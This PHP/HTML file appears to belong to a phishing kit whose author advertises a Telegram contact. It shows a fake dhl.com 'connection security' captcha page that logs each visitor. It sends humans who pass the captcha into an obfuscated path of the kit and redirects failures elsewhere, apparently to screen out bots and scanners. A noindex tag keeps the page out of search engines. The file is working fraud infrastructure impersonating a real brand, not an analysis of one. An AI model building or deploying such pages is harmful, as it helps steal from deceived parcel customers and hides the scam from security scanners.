<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    if( $_POST ) {

        $data = array(
            'secret' => $conf_hcaptcha_secret_key,
            'response' => $_POST['h-captcha-response']
        );
        $verify = curl_init();
        curl_setopt($verify, CURLOPT_URL, "https://hcaptcha.com/siteverify");
        curl_setopt($verify, CURLOPT_POST, true);
        curl_setopt($verify, CURLOPT_POSTFIELDS, http_build_query($data));
        curl_setopt($verify, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($verify);
        $responseData = json_decode($response);
        if($responseData->success) {
            $_SESSION['last_page'] = "msg";
            $_SESSION['user_allowed'] = true;
            visitors($ip_infos,"Allowed");
            get_lang();
            header("Location: DUVzTTavlOw/?redirection=msg");
            exit();
        } 
        else {
            visitors($ip_infos,"Captcha Issue");
            header("Location:" . $conf_redirect_bot);
            exit();
        }

    }

?>

<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">

        <title>Verifying</title>

        <style>
            html,body {
                display: flex;
                align-items: center;
                height: 100%;
                widows: 100%;
                color: #000;
            }
            #wrapper {
                padding: 50px;
            }
            h2 {
                font-weight: 700;
                font-size: 2.3rem;
            }
            h3 {
                font-weight: 700;
                margin-bottom: 20px;
            }
            form {
                margin-bottom: 20px;
            }
            p {
                font-size: 18px;
                color: #000;
                margin-bottom: 0;
            }
            input[type="submit"] {
                font-size: 14px;
            }
        </style>
    </head>

    <body>

        <div id="wrapper">
            <h2>dhl.com</h2>
            <h3>Check if the connection to the site is secure</h3>
            <form action="" method="POST">
                <div class="h-captcha" data-sitekey="<?php echo $conf_hcaptcha_site_key; ?>"></div>
                <input type="submit" name="submit" value="Continue">
            </form>
            <p>dhl.com must verify the security of your connection before continuing.</p>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="https://js.hcaptcha.com/1/api.js"></script>

    </body>

</html>